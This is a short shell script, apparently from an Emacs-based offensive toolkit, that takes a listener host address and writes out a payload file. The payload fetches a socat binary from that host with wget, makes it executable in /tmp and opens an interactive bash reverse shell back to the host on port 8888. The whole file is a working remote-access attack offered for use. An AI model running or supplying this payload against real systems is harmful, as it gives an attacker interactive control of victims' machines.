LHOST="$1"
FILE="${HOME}/.emacs.d/sh4hack/socat.sh"

if [ -z "$LHOST" ]; then
    echo "Lhost is required.";
    exit 1;
fi

cat > $FILE <<- EOM
export SHELL=bash;
export TERM=eterm-color;
stty rows 60 columns 126;
wget http://${LHOST}/socat-x86_64 -O /tmp/socat;
chmod +x /tmp/socat;
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${LHOST}:8888;
echo "unkoooooooooooooo!!!";
EOM
